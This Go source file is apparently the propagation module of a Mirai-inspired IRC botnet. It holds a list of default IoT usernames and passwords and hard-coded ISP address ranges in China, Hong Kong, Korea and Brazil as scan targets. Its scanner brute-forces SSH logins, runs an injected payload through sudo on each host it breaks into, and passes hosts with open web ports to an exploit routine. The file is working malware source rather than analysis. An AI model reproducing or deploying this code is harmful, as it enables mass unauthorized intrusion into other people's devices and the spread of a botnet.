package lib

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	wg         sync.WaitGroup
	coreReport *string
	randomNet  string //0.0.0.0/0

	/*
		Thank you mirai for these usernames and passwords list (You are my inspirelation).
		Add more usernames and passwords in to the slice name "userList" and "paswdList".
	*/
	userList  = []string{"admin", "root", "user", "guest", "support", "login", "zyfwp", "ZXDSL"}
	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "password", "default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp", "W!n0&oO7."}
)

var ChinaNetwork = []string{

	//CHINANET Hubei province network.

	"116.211", //116.211.0.0/16
	"119.96",  //119.96.0.0/16
	"119.97",  //119.97.0.0/16
	"119.102", //119.102.0.0/16
	"58.49",   //58.49.0.0/16
	"58.53",   //58.53.0.0/16
	"221.234", //221.234.0.0/16
	"221.235", //221.235.0.0/16

	//CHINANET Guangdong province network.

	"14.116", //14.116.0.0/16
	"14.118", //14.118.0.0/16
	"14.127", //14.127.0.0/16
	"14.29",  //14.29.0.0/16
	"121.14", //121.14.0.0/16

	//CHINANET Jiangsu province network.

	"49.70",   //49.70.0.0/16
	"114.230", //114.230.0.0/16
	"114.239", //114.239.0.0/16
	"117.93",  //117.93.0.0/16
	"121.131", //121.131.0.0/16

	//CHINANET shandong province network.

	"140.246", //140.246.0.0/16
	"140.250", //140.250.0.0/16
	"182.42",  //182.42.0.0/16
	"182.43",  //182.43.0.0/16

	//China TieTong Telecommunications Corporation.

	"36.212",  //36.212.0.0/16
	"36.208",  //36.208.0.0/16
	"36.209",  //36.209.0.0/16
	"110.218", //110.218.0.0/16
	"110.219", //110.219.0.0/16
	"110.101", //110.101.0.0/16
	"110.105", //110.105.0.0/16
	"122.88",  //122.88.0.0/16
	"122.94",  //122.94.0.0/16
	"122.95",  //122.95.0.0/16
}

var HongKongNetwork = []string{

	//Asia Pacific Network Information Center, Pty. Ltd.

	"43.129",  //43.129.0.0/16
	"43.128",  //43.128.0.0/16
	"43.132",  //43.132.0.0/16
	"43.134",  //43.134.0.0/16
	"43.154",  //43.154.0.0/16
	"160.124", //160.124.0.0/16

	//Digital Core Technology Co., Limited

	"45.207",  //45.207.0.0/16
	"103.149", //103.149.0.0/16
	"154.38",  //154.38.0.0/16
	"156.224", //156.224.0.0/16
	"156.242", //156.242.0.0/16
	"210.5",   //210.5.0.0/16
	"210.209", //210.209.0.0/16

	//ICIDC

	"154.207", //154.207.0.0/16
	"154.210", //154.210.0.0/16
	"154.222", //154.222.0.0/16
	"156.234", //156.234.0.0/16
	"156.225", //156.225.0.0/16
	"156.226", //156.226.0.0/16
}

var KoreaNetwork = []string{

	//Korea Telecom

	"14.61",   //14.61.0.0/16
	"218.155", //218.155.0.0/16
	"27.236",  //27.236.0.0/16
	"27.238",  //27.238.0.0/16
	"125.153", //125.153.0.0/16
	"125.157", //125.157.0.0/16
	"119.212", //119.212.0.0/16
	"119.221", //119.221.0.0/16
	"175.239", //175.239.0.0/16
	"175.203", //175.203.0.0/16

	//SK Broadband, Inc.

	"58.122",  //58.122.0.0/16
	"58.124",  //58.124.0.0/16
	"118.221", //118.221.0.0/16
	"118.218", //118.218.0.0/16
	"211.201", //211.201.0.0/16
	"211.54",  //211.54.0.0/16
	"218.38",  //218.38.0.0/16
	"218.101", //218.101.0.0/16
	"175.112", //175.112.0.0/16
	"175.114", //175.114.0.0/16
	"175.124", //175.124.0.0/16
	"1.234",   //1.234.0.0/16
	"1.235",   //1.235.0.0/16

	//LG DACOM Corporation

	"211.60",  //211.60.0.0/16
	"112.216", //112.216.0.0/16
	"112.217", //112.217.0.0/16
	"122.221", //112.221.0.0/16
	"123.143", //123.143.0.0/16
	"106.242", //106.242.0.0/16
	"106.245", //106.245.0.0/16
	"1.211",   //1.211.0.0/16
	"1.215",   //1.215.0.0/16
	"118.130", //118.130.0.0/16
	"58.149",  //58.149.0.0/16

	//LGTELECOM

	"223.171", //223.171.0.0/16
}

var BrazilNetwork = []string{

	//CLARO S.A.

	"177.127", //177.127.0.0/16
	"177.193", //177.193.0.0/16
	"179.214", //179.214.0.0/16
	"187.105", //187.105.0.0/16
	"187.28",  //187.28.0.0/16
	"189.17",  //189.17.0.0/16
	"189.22",  //189.22.0.0/16
	"200.166", //200.166.0.0/16
	"200.179", //200.179.0.0/16
	"200.209", //200.209.0.0/16
	"200.230", //200.230.0.0/16
	"201.31",  //201.31.0.0/16
	"201.57",  //201.57.0.0/16

	//TELEFÔNICA BRASIL S.A

	"177.43",  //177.43.0.0/16
	"177.99",  //177.99.0.0/16
	"177.207", //177.207.0.0/16
	"179.80",  //179.80.0.0/16
	"179.85",  //179.85.0.0/16
	"179.150", //179.150.0.0/16
	"187.9",   //187.9.0.0/16
	"187.74",  //187.74.0.0/16
	"187.93",  //187.93.0.0/16
	"189.108", //189.108.0.0/16
	"191.210", //191.210.0.0/16
	"191.32",  //191.32.0.0/16
}

var RandomNetwork = []string{randomNet}

func genRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func (b *Bot) manageScanRange() string {
	var ipGen []string
	ipGen = append(ipGen, b.network, ".")
	for i := 0; i < 2; i++ {
		ipGen = append(ipGen, genRange(255, 0), ".")
	}
	ipGen[len(ipGen)-1] = ""
	return strings.Join(ipGen[0:7], "")
}

func (b *Bot) checkPort(ipAddr, port string) string {
	b.timeout = 500 * time.Millisecond
	conn, err := net.DialTimeout("tcp", ipAddr+":"+port, b.timeout)
	if err != nil {
		return ""
	}
	conn.Close()
	return ipAddr
}

func sshConfig(sshUser, sshPaswd string) *ssh.ClientConfig {
	authConfig := &ssh.ClientConfig{
		User: sshUser,
		Auth: []ssh.AuthMethod{
			ssh.Password(sshPaswd),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return authConfig
}

func (b *Bot) sshExecute(comd string) {
	sshSesh, _ := b.session.NewSession()
	var setSession bytes.Buffer
	sshSesh.Stdout = &setSession
	sshSesh.Run("echo '" + b.password +
		"' | sudo -S -- sh -c '" + comd + "'")
	sshSesh.Close()
}

func setScanSwitch() {
	if setCall, setKey := SetupCaller(); setKey {
		setCall.CallBot.scanSwitch = true
	}
}

func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) bool {
	for {
		for net := range scanNetwork {
			if isRandom {
				netID := genRange(254, 1) + "."
				if _, key := BlacklistIPs[netID]; key {
					continue
				}
				RandomNetwork[0] = netID + genRange(255, 0)
			}
			b.network = scanNetwork[net]
			nextIP := b.manageScanRange()
			ptrIP := &nextIP

			if rtnIP := b.checkPort(*ptrIP, "22"); rtnIP == "" {
				/*
					Non-checking on injection process of the exploit!!!
				*/
				if b.checkPort(*ptrIP, "80") != "" || b.checkPort(*ptrIP, "8080") != "" {
					b.tempIP = *ptrIP
					b.exploitList()
				}
				b.checkPort(nextIP, "22")
			} else {
				b.tempIP = rtnIP
				var isLogin bool
				for user := range userList {
					if isLogin {
						break
					}
					for paswd := range paswdList {
						if callSwitch, keySwitch := SetupCaller(); keySwitch {
							if callSwitch.CallBot.scanSwitch {
								break
							}
						}
						sshConn, err := ssh.Dial("tcp", b.tempIP+":22", sshConfig(userList[user], paswdList[paswd]))
						b.session = sshConn
						b.password = paswdList[paswd]
						if err == nil {
							b.Report(nCores + " Installing payload: " + b.tempIP)
							go b.sshExecute(b.inject("default", false)) //Reuse command injection function from exploit.
							isLogin = true
							break
						}
						if paswd == len(paswdList)-1 {
							if !isLogin {
								b.Report(nCores + " No auth match: " + b.tempIP)
							}
						}
					}
				}
				continue
			}
			if callSwitch, keySwitch := SetupCaller(); keySwitch {
				if callSwitch.CallBot.scanSwitch {
					return true
				}
			}
		}
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallBot.scanSwitch {
				return true
			}
		}
	}
}

func (b *Bot) Scanner() {
	if setCall, setKey := SetupCaller(); setKey {
		if value, key := ScanMap[setCall.CallBot.ScanOpt]; key {
			/*
				Full core scanning of a bot CPU
				Create a concurrence following by numbers of core in CPU.

				Why use core to scan instead of thread???
				1) Because i need to be careful about overheat problem of a bot device even thread in Go are light weight.
				2) For against excess flood on IRC server when bot device or server have more than 4 cores which is equal to core times 2 when using thread.
			*/
			if b.CPU == 1 {
				singleCore := "SINGLE CORE"
				coreReport = &singleCore
			} else {
				multiCores := "[" + strconv.Itoa(b.CPU) + "] CORES"
				coreReport = &multiCores
			}
			b.DefaultArch = setCall.CallBot.DefaultArch
			b.MipsArch = setCall.CallBot.MipsArch

			b.Report(*coreReport + " START SCANNING ON " +
				value.scanOptFull + " NETWORK...")

			isBreak := make(chan bool)
			for i := 0; i < b.CPU; i++ {
				wg.Add(1)
				go func(ncpu int) {
					scanStatus := b.setupScanner(value.scanNetwork, value.isRandom, "[C"+strconv.Itoa(ncpu+1)+"]")
					if scanStatus {
						isBreak <- scanStatus
						wg.Done()
					}
				}(i)
			}
			if <-isBreak {
				b.Report(*coreReport + " STOP SCANNING ON " +
					value.scanOptFull + " NETWORK!!!")
			}
			wg.Wait()
		}
	}
}
